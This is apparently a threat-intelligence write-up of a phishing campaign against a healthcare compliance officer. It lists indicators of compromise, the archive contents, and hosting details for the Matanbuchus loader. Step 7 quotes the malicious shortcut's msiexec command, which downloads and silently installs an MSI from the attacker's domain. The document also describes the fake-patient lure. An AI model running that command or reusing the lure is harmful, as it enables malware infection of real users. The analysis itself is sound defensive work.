<div align="center">
  
# :space_invader: ardoelur[.]com :space_invader:

## :page_facing_up: Summary :page_facing_up:

<div align="left">
  
Attacker was pretending to be a potential patient who is wanting to see a doctor. Attacker sent a Google Drive link to the compliance officer's email which downloaded a zip file containing shortcuts disguised as PDFs, which downloaded and ran Matanbuchus.

<div align="center">

## :mag_right: Indicators of Compromise :mag:

| Type | Value |
| --- | --- |
| Domain | ardoelur[.]com |
| SHA256 | 053dc08c05a41bb787cc92abe168f9d8134bce97225d925bc5bd7cf74d633bf1 |
| SHA256 | 39b06b267b30e9e47ae5aa6f8291fe8bd9fdb8cee2bf7cec8cbe7eae0d48342b |
| SHA256 | 66420437b941b2a15cff4ed62f13d8ed51f7fbb9f3a7bee441b12d875a2841b2 |
| SHA256 | 775686b54d18c51c5143183d2c200a01404d626a7ef1141ff28618b0a5dbaeaa |
| SHA256 | 844448b0ce4dea216a6e447e4f7beea6ca989f685b6c7beced41b971f692a591 |
| SHA256 | d4457159fc571c73df674668fd91ef34ae05b748cbe373fa88b54de040054a2d |
| URL | hxxps[://]ardoelur[.]com/Dramatisation[.]msi |
| URL | hxxps[://]drive[.]google[.]com/file/d/1rV36AAHTVHUy2i6wSvpg4YupgQCGyU7n/view?usp=sharing |

## :checkered_flag: Attack Progression :racing_car:

<div align="left">

1) Attacker goes to the victim's company website and finds the compliance officer's email address.
2) Attacker sends an email to the compliance officer pretending to be a potential patient who is needing a recommendation for a doctor. They include a Google Drive link that they say contains their medical files, as well as the password of 1424 for the 7z file.

> The attacker's strategy is to send this to the healthcare compliance officer since they would be the most familiar with HIPAA and would potentially not scan or share any files since they would contain PHI, especially with the security department. They also password protect the 7z file to prevent email security services and AV from scanning the file. This plan fails, however, since the compliance officer does not handle these types of requests, and the documents themselves don't contain any medical information. I was able to verify this by first using an onsite sandbox, which is HIPAA compliant, even if it would have contained PHI.

3) Victim clicks on the Google Drive link: hxxps[://]drive[.]google[.]com/file/d/1rV36AAHTVHUy2i6wSvpg4YupgQCGyU7n/view?usp=sharing

![ardoelur_com (Google Drive) 01](https://github.com/user-attachments/assets/5a6d4535-6c78-4b21-aa65-b10fcc4dba88)

4) Victim downloads _findocs.7z_ ([d4457159fc571c73df674668fd91ef34ae05b748cbe373fa88b54de040054a2d](https://www.virustotal.com/gui/file/d4457159fc571c73df674668fd91ef34ae05b748cbe373fa88b54de040054a2d/detection)).

![ardoelur_com (Google Drive) 02](https://github.com/user-attachments/assets/1189eb7d-726a-414d-8b5f-ed756804f3f4)

5) Victim extracts the contents of _findocs.7z_ using 7-Zip and the password 1424.

![ardoelur_com (findocs) 01](https://github.com/user-attachments/assets/acccb1c1-2588-41b4-9e6f-2ad92480c9ca)

6) _findocs.7x_ contains 5 files:
    - _Inventory.pdf.lnk_ ([775686b54d18c51c5143183d2c200a01404d626a7ef1141ff28618b0a5dbaeaa](https://www.virustotal.com/gui/file/775686b54d18c51c5143183d2c200a01404d626a7ef1141ff28618b0a5dbaeaa/detection))
    - _inventory2.pdf_ ([844448b0ce4dea216a6e447e4f7beea6ca989f685b6c7beced41b971f692a591](https://www.virustotal.com/gui/file/844448b0ce4dea216a6e447e4f7beea6ca989f685b6c7beced41b971f692a591/detection))
    - _Manulife statement with value.pdf_ ([66420437b941b2a15cff4ed62f13d8ed51f7fbb9f3a7bee441b12d875a2841b2](https://www.virustotal.com/gui/file/66420437b941b2a15cff4ed62f13d8ed51f7fbb9f3a7bee441b12d875a2841b2/detection))
    - _Scanned inventory.pdf.lnk_ ([39b06b267b30e9e47ae5aa6f8291fe8bd9fdb8cee2bf7cec8cbe7eae0d48342b](https://www.virustotal.com/gui/file/39b06b267b30e9e47ae5aa6f8291fe8bd9fdb8cee2bf7cec8cbe7eae0d48342b/detection))
    - _Statement_2024.lnk_ ([39b06b267b30e9e47ae5aa6f8291fe8bd9fdb8cee2bf7cec8cbe7eae0d48342b](https://www.virustotal.com/gui/file/39b06b267b30e9e47ae5aa6f8291fe8bd9fdb8cee2bf7cec8cbe7eae0d48342b/detection))

![ardoelur_com (findocs) 02](https://github.com/user-attachments/assets/c3e42b29-0876-4925-ab88-98f9ea2b6d1e)

> _Scanned inventory.pdf.lnk_ and _Statement_2024.lnk_ are the same file, just with different names. The only malicious files are the shortcuts: _Inventory.pdf.lnk_, _Scanned inventory.pdf.lnk_, and _Statement_2024.lnk_. _Manulife statement with value.pdf_ is an encrypted PDF, which is not called upon at any point during the attack and cannot be opened with the 1424 password. _inventory2.pdf_ is a benign PDF of an inventory of assets for a probated estate in New Castle County in Delaware. The form is filled out with personal information. A portion of this document is listed below; however, I have cropped out much of the document to protect the PII contained within it. 

![ardoelur_com (findocs) 03](https://github.com/user-attachments/assets/b4a219e5-4ef3-4291-afe3-c472e13e1042)

7) The victim clicks on one of the shortcuts disguised as PDFs, which executes the following code:

```batchfile
"C:\Windows\system32\msiexec[.]exe" -package httPs:/\ardoelur.com/Dramatisation.msi -q
```

![ardoelur_com (findocs) 04](https://github.com/user-attachments/assets/cf353c4c-02a5-4efc-8d9f-79559fba002d)

8) _Dramatisation.msi_ ([053dc08c05a41bb787cc92abe168f9d8134bce97225d925bc5bd7cf74d633bf1](https://www.virustotal.com/gui/file/053dc08c05a41bb787cc92abe168f9d8134bce97225d925bc5bd7cf74d633bf1/detection)) is downloaded and executed. _Dramatisation.msi_ is a Matanbuchus Loader, which is a MaaS (Malware-as-a-Service). Information concerning Matanbuchus can be found here on Palo Alto's website: [Matanbuchus: Malware-as-a-Service with Demonic Intentions](https://unit42.paloaltonetworks.com/matanbuchus-malware-as-a-service/).

<div align="center">

## :bulb: OSINT Insights :bulb:

<div align="left">
  
1) [URLScan](https://urlscan.io/result/3dd1cd27-cb8f-4374-8b15-cbde72b9055b/#summary) shows a scan of _hxxps[://]ardoelur[.]com/project/blog666/_ on June 21st, 2024. The screenshot shows that this is the login page for the Matanbuchus Loader this attacker is using.

![3dd1cd27-cb8f-4374-8b15-cbde72b9055b](https://github.com/user-attachments/assets/e4dc29e7-7f6c-46ea-9b2d-7d0da36c4401)

2) _ardoelur[.]com_ is hosted on a Russian server at _194[.]67[.]193[.]43_.

![194_67_193_43 (Historical A)](https://github.com/user-attachments/assets/dc392312-fc58-4084-be28-e7b9b4fa2a13)

3) Two other domains are currently utilizing _194[.]67[.]193[.]43_: _comarmo[.]com_ and _maduroma[.]com_. Both domains have the same Matanbuchus dashboard in the same file path: [_hxxps[://]comarmo[.]com/project/blog666/_](https://urlscan.io/result/c56882c5-7aa3-4c2d-b745-35330e53a637/) and [_hxxps[://]maduroma[.]com/project/blog666/_](https://urlscan.io/result/da20d303-4e7c-427a-94ac-378ede03cee4/).

4) _Dramatisation.msi_ is using the British English version. The American English version is spelled _dramatization_.
